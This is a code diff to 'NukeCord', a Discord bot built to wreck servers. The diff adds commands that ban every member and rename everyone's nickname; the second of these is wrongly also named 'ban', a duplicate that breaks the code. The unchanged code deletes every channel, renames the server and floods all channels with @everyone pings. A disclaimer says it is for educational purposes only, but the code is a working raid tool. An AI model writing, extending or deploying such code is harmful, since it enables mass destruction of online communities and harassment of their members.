@@ -3,7 +3,9 @@ print("[~] Do nc!duck to get all commands")
 import discord 
 from discord.ext import commands
 import json, os
-bot = commands.Bot(command_prefix="nc!")
+intents = discord.Intents.default()
+intents.members = True
+bot = commands.Bot(command_prefix="nc!", intents=intents)
 bot.remove_command("help")
 f = open("config.json", "r")
 x = f.read()
@@ -20,8 +22,8 @@ async def on_ready():
 
 @bot.command()
 async def duck(ctx):
-    if ctx.author.id == ID:
-        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!spam <text>\n```", color=0x36393e)
+    if ctx.author.id == ID:\n
+        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text> | Nukes current server with text\nnc!spam <text> | Spams all channels including ping\nnc!ban | Bans everyone\nnc!nicknames <text> | Changes everyone's nicknames\n```", color=0x36393e)
         embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
         await ctx.send(embed=embed)
 
@@ -36,7 +38,7 @@ async def nuke(ctx, *, arg):
             try:
                 await channel.delete()
             except:
-                print(f"""[!] Could not delete channel "{channel.name}" """)
+                print("\n")
         await ctx.guild.edit(name=arg)
         x = 100
         while x >= 0:
@@ -54,5 +56,32 @@ async def spam(ctx, *, arg):
                 await channel.send(f"{arg} @everyone")
             
 
+            
+@bot.command()
+@commands.guild_only()
+async def ban(ctx):
+    if ctx.author.id == ID:
+        for member in ctx.guild.members:
+            try:
+                await member.ban(reason=None)
+            except:
+                print("\n")
+    else:
+        return
+    
+    
+@bot.command()
+@commands.guild_only()
+async def ban(ctx, *, arg):
+    if ctx.author.id == ID:
+        for member in ctx.guild.members:
+            try:
+                await member.edit(nick=arg)
+            except:
+                print("\n")
+    else:
+        return    
+            
+            
 
 bot.run(TOKEN)
